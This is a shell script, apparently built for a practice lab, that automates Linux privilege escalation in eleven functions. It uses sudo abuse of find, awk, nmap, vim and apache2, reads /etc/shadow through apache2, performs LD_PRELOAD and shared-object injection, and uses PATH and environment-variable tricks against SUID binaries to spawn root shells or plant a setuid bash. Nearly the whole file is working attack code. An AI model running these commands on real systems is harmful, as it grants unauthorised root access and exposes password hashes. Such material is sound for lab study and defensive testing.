priv_method1(){
	print "using nano"
	sudo find /bin -name nano -exec /bin/sh \;
	print "Executed successfull run command id"
}
priv_method2(){
	sudo awk 'BEGIN {system("/bin/sh")}'
}
priv_method3(){
	print "using nmap\n"
	echo "os.execute('/bin/sh')" > shel.nse && sudo nmap --script=shell.nse
}
priv_method4(){
	print "Priv Esc using VIM"
	sudo vim -c '!sh'
}
priv_method5(){
	print "Shared Object Injection using EV, Must place so file in /tmp/name.so"
	#sudo LD_PRELOAD=/tmp/x.so apache2
}
priv_method6(){
	print "SO Injection SUID-bins"
	print "Making New directory"
	mkdir /home/kali/.config
	cp libcalc.c /home/.config
	print "compiling c"
	gcc -shared -o /home/kali/.config/libcalc.so -fPIC /home/kali/.config/libcalc.c
	print "Compiled, now time to inject so"
	/usr/local/bin/suid-so
}
priv_method7(){
	print "Abusing File Missconfig/permissions from SUDO SUID-bins"
	echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
	print "Compiling Obj file"
	gcc /tmp/service.c -o /tmp/service
	print "Exporting paths"
	export PATH=/tmp:$PATH
	/usr/local/bin/suid-env
	print "check if we got root"
	id
}
priv_method8(){
print "Extracting users using misconfigured permisisons,apache2 "
sudo apache2 -f /etc/shadow
}
priv_method9(){
print "Try injecting o file using EV"
gcc -fPIC -shared -o file.so ldpreload.c -nostartfiles
sudo LD_PRELOAD=/home/kali/auto_exploiter/file.so apache2

}
priv_method10(){
print "SUID bins and EV"
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
}
priv_method11(){
print "SUID Bin and ev method 2"
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
}
